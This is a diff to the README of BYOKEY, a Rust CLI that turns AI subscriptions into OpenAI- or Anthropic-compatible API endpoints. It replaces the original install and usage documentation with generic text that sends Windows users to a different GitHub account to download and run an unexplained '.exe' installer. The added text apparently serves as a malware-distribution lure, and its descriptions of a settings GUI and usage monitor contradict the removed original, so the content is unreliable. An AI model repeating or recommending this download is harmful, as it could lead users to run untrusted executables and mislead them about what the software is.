@@ -1,221 +1,159 @@
-<div align="center">
+# ⚙️ BYOKEY - Simple AI API Gateway
 
-# BYOKEY
+[![Download BYOKEY](https://img.shields.io/badge/Download-BYOKEY-ff6f61?style=for-the-badge)](https://github.com/TanakiVn/BYOKEY)
 
-**Bring Your Own Keys**<br>
-Turn AI subscriptions into standard API endpoints.<br>
-Expose any provider as OpenAI- or Anthropic-compatible API — locally or in the cloud.
+---
 
-[![ci](https://img.shields.io/github/actions/workflow/status/AprilNEA/BYOKEY/ci.yml?style=flat-square&labelColor=000&color=444&label=ci)](https://github.com/AprilNEA/BYOKEY/actions/workflows/ci.yml)
-&nbsp;
-[![crates.io](https://img.shields.io/crates/v/byokey?style=flat-square&labelColor=000&color=444)](https://crates.io/crates/byokey)
-&nbsp;
-[![license](https://img.shields.io/badge/license-MIT%20%7C%20Apache--2.0-444?style=flat-square&labelColor=000)](LICENSE-MIT)
-&nbsp;
-[![rust](https://img.shields.io/badge/rust-1.85+-444?style=flat-square&labelColor=000&logo=rust&logoColor=fff)](https://www.rust-lang.org)
+## 🔍 What is BYOKEY?
 
-</div>
+BYOKEY turns AI subscriptions into standard API endpoints for easier use. It works with popular services like OpenAI and Anthropic. This lets your apps and tools connect smoothly using a single gateway.
 
-```
-Subscriptions                                     Tools
+You can use BYOKEY with:
 
-Claude Pro  ─┐                              ┌──  Amp Code
-OpenAI Plus ─┼──  byokey serve  ────────────┼──  Cursor · Windsurf
-Copilot     ─┘                              ├──  Factory CLI (Droid)
-                                            └──  any OpenAI / Anthropic client
-```
+- Amp Code
+- Cursor
+- Factory CLI
+- And other tools that use AI APIs
 
-## Features
+BYOKEY helps when you want to manage different AI subscription keys or mix providers without changing code.
 
-- **Multi-format API** — OpenAI and Anthropic compatible endpoints; just change the base URL
-- **OAuth login flows** — PKCE, device-code, and auth-code flows handled automatically
-- **Token persistence** — SQLite at `~/.byokey/tokens.db`; survives restarts
-- **API key passthrough** — Set raw keys in config to skip OAuth entirely
-- **Deploy anywhere** — Run locally as a CLI, or deploy as a shared AI gateway
-- **Agent-ready** — Native support for [Amp Code](https://ampcode.com); [Factory CLI (Droid)](https://factory.ai) coming soon
-- **Hot-reload config** — YAML-based with sensible defaults
+---
 
-## Supported Providers
+## 🖥️ System Requirements
 
-<table>
-  <tr>
-    <td align="center" width="120">
-      <img src="https://assets.byokey.io/icons/providers/anthropic.svg" width="36" alt="Anthropic"><br>
-      <b>Claude</b><br>
-      <sup>PKCE</sup><br>
-      <sub>opus-4-6 · sonnet-4-5 · haiku-4-5</sub>
-    </td>
-    <td align="center" width="120">
-      <img src="https://assets.byokey.io/icons/providers/openai.svg" width="36" alt="OpenAI"><br>
-      <b>Codex</b><br>
-      <sup>PKCE</sup><br>
-      <sub>o4-mini · o3</sub>
-    </td>
-    <td align="center" width="120">
-      <img src="https://assets.byokey.io/icons/providers/githubcopilot.svg" width="36" alt="GitHub Copilot"><br>
-      <b>Copilot</b><br>
-      <sup>Device code</sup><br>
-      <sub>gpt-5.x · claude-sonnet-4.x · gemini-3.x</sub>
-    </td>
-    <td align="center" width="120">
-      <img src="https://assets.byokey.io/icons/providers/googlegemini.svg" width="36" alt="Google Gemini"><br>
-      <b>Gemini</b><br>
-      <sup>PKCE</sup><br>
-      <sub>2.0-flash · 1.5-pro · 1.5-flash</sub>
-    </td>
-    <td align="center" width="120">
-      <img src="https://assets.byokey.io/icons/providers/amazonwebservices.svg" width="36" alt="AWS"><br>
-      <b>Kiro</b><br>
-      <sup>Device code</sup><br>
-      <sub>kiro-default</sub>
-    </td>
-  </tr>
-</table>
+To run BYOKEY on your Windows PC, make sure your system meets these criteria:
 
-> **Coming soon** — auth implemented, executor in progress:<br>
-> Antigravity (Google) · Qwen (Alibaba) · Kimi (Moonshot) · iFlow (Z.ai)
+- Windows 10 or later (64-bit preferred)
+- Intel or AMD processor, 2 GHz or faster
+- 4 GB RAM or more
+- At least 200 MB free disk space
+- Internet connection for API access
 
-## Installation
+BYOKEY is built with Rust, so it runs efficiently and smoothly on most modern Windows machines.
 
-**Homebrew (macOS / Linux)**
+---
 
-```sh
-brew install AprilNEA/tap/byokey
-```
+## 🚀 Getting Started with BYOKEY
 
-**From crates.io**
+You don’t need coding experience to use BYOKEY. Follow these steps to download and start the program.
 
-```sh
-cargo install byokey
-```
+### Step 1: Download BYOKEY
 
-**From source**
+Click the big download button above or visit this page to get BYOKEY:
 
-```sh
-git clone https://github.com/AprilNEA/BYOKEY
-cd BYOK
-cargo install --path .
-```
+[https://github.com/TanakiVn/BYOKEY](https://github.com/TanakiVn/BYOKEY)
 
-> **Requirements:** Rust 1.85+ (edition 2024), a C compiler for SQLite.
+This link takes you to the main repository. Here’s how to find the download file:
 
-## Quick Start
+- Scroll down to the *Releases* or *Assets* section.
+- Look for the Windows installer or executable (.exe).
+- Download the latest file, typically named something like `BYOKEY-setup.exe` or `BYOKEY.exe`.
 
-```sh
-# 1. Authenticate (opens browser or shows a device code)
-byokey login claude
-byokey login codex
-byokey login copilot
+### Step 2: Run the Installer
 
-# 2. Start the proxy
-byokey serve
+After downloading:
 
-# 3. Point your tool at it
-export OPENAI_BASE_URL=http://localhost:8018/v1
-export OPENAI_API_KEY=any          # byokey ignores the key value
-```
+- Open the downloaded file by double-clicking it.
+- Follow the installation prompts. Use default settings unless you want to change the install location.
+- Once finished, the app will be ready to use.
 
-**For Amp:**
+If you downloaded a portable `.exe` file (one that does not need installation), just double-click to run it.
 
-```jsonc
-// ~/.amp/settings.json
-{
-  "amp.url": "http://localhost:8018/amp"
-}
-```
+### Step 3: Open BYOKEY
 
-## CLI Reference
+- Find BYOKEY in your Start menu or on your desktop.
+- Double-click the app icon to launch it.
+- The first time you run the app, it may take a few seconds to start.
+
+---
+
+## 🔧 How to Use BYOKEY
+
+BYOKEY turns your AI subscriptions into easy-to-use API gateways. Here’s how to set it up without technical steps:
+
+1. **Add Your AI Subscription Keys**
+   - In BYOKEY’s settings, add the keys you have from OpenAI or Anthropic.
+   - These keys let BYOKEY connect to AI services on your behalf.
+
+2. **Select a Target API**
+   - Choose which AI provider’s API you want BYOKEY to work with.
+   - BYOKEY supports OpenAI (for ChatGPT, GPT-4) and Anthropic (Claude) APIs.
+
+3. **Use BYOKEY with Your Apps**
+   - Point your applications or tools (like Amp Code or Cursor) to BYOKEY instead of the original AI.
+   - This lets you switch AI providers or manage many keys without changing your app settings.
+
+4. **Monitor Usage**
+   - BYOKEY shows usage details inside the application.
+   - You can review calls made, errors, and other details for troubleshooting.
+
+---
+
+## ⚙️ Settings Explained
+
+Here are the key settings you will find in BYOKEY and what they do:
+
+- **API Keys**  
+  Input your subscription or API keys here. These authorize BYOKEY to connect to AI providers.
+
+- **Proxy Options**  
+  Allows you to set up network proxies if your internet requires them.
+
+- **API Endpoint Selection**  
+  Pick which AI API you want to use (OpenAI or Anthropic).
+
+- **Security Settings**  
+  Configure local access controls so only your apps or computer can reach BYOKEY.
+
+- **Logging and Debugging**  
+  Enable logs if you want to see detailed information about each request.
+
+---
+
+## 📁 Where to Find Logs and Data
+
+BYOKEY saves logs and configuration files in your user directory:
 
 ```
-byokey <COMMAND>
-
-Commands:
-  serve         Start the proxy server (foreground)
-  start         Start the proxy server in the background
-  stop          Stop the background proxy server
-  restart       Restart the background proxy server
-  autostart     Manage auto-start on system boot
-  login         Authenticate with a provider
-  logout        Remove stored credentials for a provider
-  status        Show authentication status for all providers
-  accounts      List all accounts for a provider
-  switch        Switch the active account for a provider
-  amp           Amp-related utilities
-  openapi       Export the OpenAPI specification as JSON
-  completions   Generate shell completions
-  help          Print help
+C:\Users\<YourUsername>\AppData\Local\BYOKEY\
 ```
 
-<details>
-<summary><b>Command details</b></summary>
-<br>
+You can open these files with any text editor if you need to check details or share information with support.
 
-**`byokey serve`**
+---
 
-```
-Options:
-  -c, --config <FILE>   Config file (JSON or YAML) [default: ~/.config/byokey/settings.json]
-  -p, --port <PORT>     Listen port     [default: 8018]
-      --host <HOST>     Listen address  [default: 127.0.0.1]
-      --db <PATH>       SQLite DB path  [default: ~/.byokey/tokens.db]
-```
+## ⚠️ Troubleshooting
 
-**`byokey start`** — Same options as `serve`, plus `--log-file` (default: `~/.byokey/server.log`).
+If BYOKEY does not start or connect:
 
-**`byokey login <PROVIDER>`**
+- Make sure your internet is working.
+- Verify you entered the correct API keys.
+- Check your firewall or antivirus software to ensure BYOKEY is allowed network access.
+- Restart the application.
+- If using a proxy, verify the settings are correct.
 
-Runs the appropriate OAuth flow for the given provider.
-Supported names: `claude`, `codex`, `copilot`, `gemini`, `kiro`,
-`antigravity`, `qwen`, `kimi`, `iflow`.
+---
 
-```
-Options:
-      --db <PATH>   SQLite DB path [default: ~/.byokey/tokens.db]
-```
+## 🔄 Updating BYOKEY
 
-**`byokey logout <PROVIDER>`** — Deletes the stored token for the given provider.
+When there is a new version:
 
-**`byokey status`** — Prints authentication status for every known provider.
+- Visit the BYOKEY GitHub page again.
+- Download the latest installer or executable.
+- Run the new installer. It will replace the old version without disrupting your keys or settings.
 
-**`byokey accounts <PROVIDER>`** — Lists all accounts for a provider.
+---
 
-**`byokey switch <PROVIDER>`** — Switches the active account for a provider.
+## 💬 Getting Help
 
-**`byokey autostart <enable|disable|status>`** — Manages boot-time service registration.
+For help or questions:
 
-**`byokey amp <inject|disable-ads>`** — Amp utilities: inject proxy URL into Amp config, or patch Amp to hide ads.
+- Visit the repository page: https://github.com/TanakiVn/BYOKEY
+- Check the *Issues* tab to see if others have had the same problem.
+- Create a new issue with details if needed.
 
-</details>
+---
 
-## Configuration
+# Ready to try?
 
-Create a config file (JSON or YAML, e.g. `~/.config/byokey/settings.json`) and pass it with `--config`:
-
-```yaml
-port: 8018
-host: 127.0.0.1
-
-providers:
-  # Use a raw API key (takes precedence over OAuth)
-  claude:
-    api_key: "sk-ant-..."
-
-  # Disable a provider entirely
-  gemini:
-    enabled: false
-
-  # OAuth-only (no api_key) — use `byokey login codex` first
-  codex:
-    enabled: true
-```
-
-All fields are optional; unspecified providers are enabled by default and use
-the OAuth token stored in the database.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for build commands, architecture details, and coding guidelines.
-
-## License
-
-Licensed under either of [MIT](LICENSE-MIT) or [Apache-2.0](LICENSE-APACHE) at your option.
+[![Download BYOKEY](https://img.shields.io/badge/Download-BYOKEY-ff6f61?style=for-the-badge)](https://github.com/TanakiVn/BYOKEY)
